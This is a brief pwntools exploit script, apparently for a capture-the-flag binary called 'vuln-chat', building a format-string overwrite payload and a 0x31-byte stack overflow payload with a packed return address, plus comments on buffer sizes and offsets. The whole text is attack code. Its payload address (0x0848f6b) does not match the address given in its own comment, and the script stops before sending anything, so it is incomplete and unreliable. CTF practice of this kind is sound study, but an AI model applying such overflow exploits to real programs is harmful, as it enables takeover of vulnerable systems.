from pwn import *

target = process('./vuln-chat')








payload1 = b'\x00' *0x14 + b'99%s'
payload2 = b'\x01'*0x31 + p32(0x0848f6b)





# last func to overwrite at 0x804856bi
# Two 20 byte buffers that read in a password and a name 
# 32 bit executable 
# fmt string "%30s"


# pass we can overwrite with 0xffffd02c -0xffffcffb bytes 0x31 bytes
